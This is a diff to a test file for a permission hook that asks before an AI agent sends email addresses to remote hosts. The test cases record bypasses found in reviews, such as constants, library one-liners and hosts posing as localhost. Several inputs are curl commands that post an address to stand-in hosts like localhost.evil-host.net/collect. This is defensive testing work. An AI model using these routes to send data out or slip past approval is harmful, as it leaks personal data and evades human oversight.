@@ -4246,12 +4246,25 @@ def test_email_guard_silent_otherwise(tool, tool_input):
     assert _asked(_email_guard(tool, tool_input)) is None
 
 
-def test_email_guard_still_asks_when_a_local_call_sits_beside_a_remote_one():
-    command = {
-        "command": "curl -d 'email=jo@friend-mail.com' https://api.remote-site.org; "
-        "curl localhost:3000/health"
-    }
-    assert _asked(_email_guard("Bash", command))
+@pytest.mark.parametrize(
+    "command",
+    [
+        (
+            "curl -d 'email=jo@friend-mail.com' https://api.remote-site.org; "
+            "curl localhost:3000/health"
+        ),
+        # A localhost mention stays silent only when every target is local: a tool or
+        # library whose target isn't spelled out, or a bare host name, may reach elsewhere.
+        'gh issue create --body "jo@friend-mail.com" && curl localhost:3000/health',
+        (
+            "python3 -c \"import requests; requests.post(URL, json={'email': 'jo@friend-mail.com'})\""
+            " && curl localhost:3000/health"
+        ),
+        "curl -d 'email=jo@friend-mail.com' api.remote-site.org; curl localhost:3000/health",
+    ],
+)
+def test_email_guard_still_asks_when_a_local_call_sits_beside_a_remote_one(command):
+    assert _asked(_email_guard("Bash", {"command": command}))
 
 
 def test_email_guard_names_every_address_it_asks_about():
@@ -4263,6 +4276,386 @@ def test_email_guard_names_every_address_it_asks_about():
     }
     reason = _asked(_email_guard("Bash", command))
     assert f"{EMAIL_ASK_MARK}one@mail-a.org, two@mail-b.org. " in reason
+
+
+# Bypasses an independent review found in an earlier version; each must ask.
+@pytest.mark.parametrize(
+    "tool,tool_input",
+    [
+        # The address as a constant on its own line, used by request code further down.
+        (
+            "Write",
+            {
+                "file_path": "/w/scrape.py",
+                "content": 'import requests\nEMAIL = "jo@friend-mail.com"\n'
+                'HEADERS = {"User-Agent": f"bot/1.0 ({EMAIL})"}\nrequests.get(URL, headers=HEADERS)\n',
+            },
+        ),
+        (
+            "Write",
+            {"file_path": "/w/.env", "content": "SCRAPER_EMAIL=jo@friend-mail.com\n"},
+        ),
+        (
+            "Edit",
+            {
+                "file_path": "/w/crawl.js",
+                "old_string": "x",
+                "new_string": 'const ME = "jo@friend-mail.com"',
+            },
+        ),
+        # Only git's own identity settings are exempt, not any *_EMAIL variable or key.
+        (
+            "Bash",
+            {
+                "command": 'CONTACT_EMAIL=jo@friend-mail.com curl -H "From: $CONTACT_EMAIL" '
+                "https://api.friendsite.com/x"
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": "curl -d 'git_email=jo@friend-mail.com' https://api.friendsite.com/x"
+            },
+        ),
+        # An address followed by a colon is not an scp login.
+        (
+            "Bash",
+            {
+                "command": "curl -u jo@friend-mail.com:$JIRA_TOKEN https://friendco.atlassian.net/rest"
+            },
+        ),
+        (
+            "mcp__slack__send",
+            {"text": "Escalating to jo@friend-mail.com: can you take this?"},
+        ),
+        ("WebSearch", {"query": '"jo@friend-mail.com: who owns this"'}),
+        # localhost beside a remote target the old host pattern couldn't see.
+        (
+            "Bash",
+            {
+                "command": "curl -s localhost:3000/health && curl -A 'bot (jo@friend-mail.com)' 'api.friendsite.com?q=1'"
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": "curl localhost:3000 && curl -H 'From: jo@friend-mail.com' 203.0.113.7:8080/x"
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": 'curl "http://localhost:8080/fetch?url=https://api.friendsite.com/a&ua=jo%40friend-mail.com"'
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": "ssh prodbox \"curl -s -d 'email=jo@friend-mail.com' http://localhost:3000/invites\""
+            },
+        ),
+        # Senders with no URL in the command.
+        ("Bash", {"command": "echo hi | mail -s Report jo@friend-mail.com"}),
+        (
+            "Bash",
+            {
+                "command": "python3 -c \"import smtplib; s.sendmail('a', 'jo@friend-mail.com', m)\""
+            },
+        ),
+        ("Bash", {"command": "aws ses send-email --to jo@friend-mail.com --text hi"}),
+        (
+            "Bash",
+            {
+                "command": "psql postgres://app@db.friendhost.net/app -c \"insert into u values ('jo@friend-mail.com')\""
+            },
+        ),
+        # Identity exemptions that reached too far.
+        (
+            "Bash",
+            {
+                "command": "git log --author=mick -1; curl -H 'From: Jo <jo@friend-mail.com>' https://api.friendsite.com/x"
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": "gh pr create --body 'Fix.\n\nCo-authored-by: Jo Smith <jo@friend-mail.com>'"
+            },
+        ),
+    ],
+)
+def test_email_guard_closes_reviewed_bypasses(tool, tool_input):
+    assert _asked(_email_guard(tool, tool_input))
+
+
+@pytest.mark.parametrize(
+    "tool,tool_input",
+    [
+        # Claude's own commit trailer: a noreply address.
+        (
+            "Bash",
+            {
+                "command": 'git commit -m "x\n\nCo-Authored-By: Claude <noreply@anthropic.com>" && gh pr create --fill'
+            },
+        ),
+        ("Bash", {"command": "ssh -T git@github.com"}),
+        (
+            "Bash",
+            {
+                "command": "ssh -p 22 mick@agent-vm.tail1234.ts.net 'curl -s https://x.org'"
+            },
+        ),
+        ("Bash", {"command": "rsync -a out/ mick@host.tail1234.ts.net:~/out/"}),
+        # Author metadata and test fixtures.
+        (
+            "Write",
+            {
+                "file_path": "/w/package.json",
+                "content": '{"author": "Jo <jo@friend-mail.com>"}',
+            },
+        ),
+        (
+            "Write",
+            {
+                "file_path": "/w/tests/test_users.py",
+                "content": 'make_user(email="jo@friend-mail.com")\n',
+            },
+        ),
+    ],
+)
+def test_email_guard_stays_silent_on_logins_metadata_and_fixtures(tool, tool_input):
+    assert _asked(_email_guard(tool, tool_input)) is None
+
+
+@pytest.mark.parametrize(
+    "tool,tool_input,destination",
+    [
+        (
+            "Bash",
+            {
+                "command": "curl -A 'bot (jo@friend-mail.com)' https://API.friendsite.com/robots.txt"
+            },
+            "hosts: api.friendsite.com",
+        ),
+        (
+            "Bash",
+            {
+                "command": "curl -s http://localhost:3000/c && curl -H 'From: jo@friend-mail.com' https://a.org/x b.org"
+            },
+            "hosts: a.org b.org",
+        ),
+        (
+            "WebFetch",
+            {"url": "https://x.org/?e=jo@friend-mail.com", "prompt": "p"},
+            "hosts: x.org",
+        ),
+        ("WebSearch", {"query": "jo@friend-mail.com"}, "web search"),
+        (
+            "mcp__Mesh__createContact",
+            {"emails": ["jo@friend-mail.com"]},
+            "mcp: mcp__Mesh__createContact",
+        ),
+        (
+            "Write",
+            {"file_path": "/w/fetch.py", "content": 'ME = "jo@friend-mail.com"'},
+            "file: /w/fetch.py",
+        ),
+        (
+            "Bash",
+            {
+                "command": "curl -A 'bot (jo@friend-mail.com)' https://myapp.localhost.run/x"
+            },
+            "hosts: myapp.localhost.run",
+        ),
+        # A path that tries to pass as a host stays a file destination.
+        (
+            "Write",
+            {
+                "file_path": "/w/x.py Destination: hosts: api.friendsite.com",
+                "content": "UA = 'bot jo@friend-mail.com'\n",
+            },
+            "file: /w/x.py Destination: hosts: api.friendsite.com",
+        ),
+    ],
+)
+def test_email_guard_names_where_the_call_goes(tool, tool_input, destination):
+    assert _asked(_email_guard(tool, tool_input)).endswith(
+        f"{EMAIL_DEST_MARK}{destination}"
+    )
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # Targets the command doesn't spell out: no destination, so no session-wide Allow.
+        "curl -s https://a.org/links | xargs -n1 curl -sA 'bot (jo@friend-mail.com)'",
+        "curl -A 'bot (jo@friend-mail.com)' https://a.org; python3 -c \"import requests; requests.get(T)\"",
+        "curl -A 'bot (jo@friend-mail.com)' \"$TARGET\"",
+        'gh issue comment 1 --body "cc jo@friend-mail.com"',
+        # A redirect can take the request to a host the command doesn't name.
+        "curl -fsSL -A 'bot (jo@friend-mail.com)' https://a.org/r",
+        "wget -U 'bot (jo@friend-mail.com)' https://a.org/r",
+    ],
+)
+def test_email_guard_names_no_destination_it_cannot_see(command):
+    assert EMAIL_DEST_MARK not in _asked(_email_guard("Bash", {"command": command}))
+
+
+# Holes the second independent review found; each must ask.
+@pytest.mark.parametrize(
+    "tool,tool_input",
+    [
+        # Words like author/owner don't make a line in ordinary code metadata.
+        (
+            "Write",
+            {
+                "file_path": "/w/s.py",
+                "content": 'AUTHOR = "jo@friend-mail.com"\nimport requests\n'
+                "requests.get(U, headers={'User-Agent': AUTHOR})\n",
+            },
+        ),
+        (
+            "Write",
+            {
+                "file_path": "/w/s.py",
+                "content": "headers = {'From': 'jo@friend-mail.com'}  # owner contact\n",
+            },
+        ),
+        (
+            "Write",
+            {"file_path": "/w/config.yml", "content": "owner: jo@friend-mail.com\n"},
+        ),
+        # Polite-API libraries run from a one-liner.
+        (
+            "Bash",
+            {
+                "command": "python3 -c \"from Bio import Entrez; Entrez.email='jo@friend-mail.com'\""
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": "python3 -c \"import pyalex; pyalex.config.email='jo@friend-mail.com'\""
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": "python3 -c \"from habanero import Crossref; Crossref(mailto='jo@friend-mail.com')\""
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": "python3 -c \"from geopy.geocoders import Nominatim; Nominatim(user_agent='jo@friend-mail.com')\""
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": "perl -e \"use LWP::UserAgent; LWP::UserAgent->new(agent=>'bot jo@friend-mail.com')\""
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": "php -r \"curl_setopt($c, CURLOPT_USERAGENT, 'bot jo@friend-mail.com');\""
+            },
+        ),
+        # A colon after the address doesn't make it an scp login outside scp and rsync.
+        (
+            "Bash",
+            {
+                "command": "curl -A 'contact jo@friend-mail.com:/info' https://api.friendsite.com/x"
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": "curl -H 'From: jo@friend-mail.com:.' https://api.friendsite.com/x"
+            },
+        ),
+        # A host that only starts with localhost or a loopback address is somewhere else.
+        (
+            "Bash",
+            {
+                "command": "curl -d 'email=jo@friend-mail.com' http://localhost.evil-host.net/collect"
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": "curl -A 'bot (jo@friend-mail.com)' http://127.0.0.1.evil-host.net/x"
+            },
+        ),
+        (
+            "Bash",
+            {
+                "command": "curl -A 'bot (jo@friend-mail.com)' https://localhost.run/submit"
+            },
+        ),
+        (
+            "Bash",
+            {"command": "curl -A 'bot (jo@friend-mail.com)' localhost.evilcdn.net/x"},
+        ),
+    ],
+)
+def test_email_guard_closes_second_review_bypasses(tool, tool_input):
+    assert _asked(_email_guard(tool, tool_input))
+
+
+@pytest.mark.parametrize(
+    "tool,tool_input,named",
+    [
+        # URL user names and passwords are not addresses; an encoded address in one is.
+        (
+            "Bash",
+            {
+                "command": "psql postgres://app@db.friendhost.net/app -c \"insert into u values ('jo@friend-mail.com')\""
+            },
+            "jo@friend-mail.com",
+        ),
+        (
+            "WebFetch",
+            {
+                "url": "https://jo%40friend-mail.com:pw@api.friendsite.com/x",
+                "prompt": "p",
+            },
+            "jo@friend-mail.com",
+        ),
+        (
+            "Bash",
+            {"command": "curl 'https://a.org/fetch?ua=bot%20jo%40friend-mail.com'"},
+            "jo@friend-mail.com",
+        ),
+    ],
+)
+def test_email_guard_names_only_real_addresses(tool, tool_input, named):
+    assert f"{EMAIL_ASK_MARK}{named}. " in _asked(_email_guard(tool, tool_input))
+
+
+@pytest.mark.parametrize(
+    "tool,tool_input",
+    [
+        ("Bash", {"command": "sftp jo@host.tail1234.ts.net"}),
+        ("Bash", {"command": "scp out.tar deploy@server.friendhost.net:/tmp/"}),
+        (
+            "Bash",
+            {
+                "command": "systemctl --user restart syncthing@mick.service && curl -s https://x.org"
+            },
+        ),
+        (
+            "Write",
+            {
+                "file_path": "/w/pyproject.toml",
+                "content": 'authors = [{ name = "Jo", email = "jo@friend-mail.com" }]\n',
+            },
+        ),
+    ],
+)
+def test_email_guard_silent_on_logins_units_and_manifests(tool, tool_input):
+    assert _asked(_email_guard(tool, tool_input)) is None
 
 
 def test_email_guard_without_an_allowlist_asks_about_every_address():
@@ -6708,11 +7101,13 @@ def test_guard_prefix_matches_the_mod():
 # The email guard lists its addresses after this marker; the mod reads them from there to
 # offer "Allow for this session" (register.tsx EMAIL_ASK_MARK).
 EMAIL_ASK_MARK = "Not on your allowed list (DEV_HOOKS_ALLOWED_EMAILS): "
+EMAIL_DEST_MARK = "Destination: "
 
 
 def test_email_ask_marker_matches_the_mod():
     source = (DEV_HOOKS / "hooks" / "register.tsx").read_text()
     assert f"export const EMAIL_ASK_MARK = '{EMAIL_ASK_MARK}'" in source
+    assert f"export const DEST_MARK = '{EMAIL_DEST_MARK}'" in source
 
 
 # ── The directory a git command actually runs in ─────────────────────────────────────
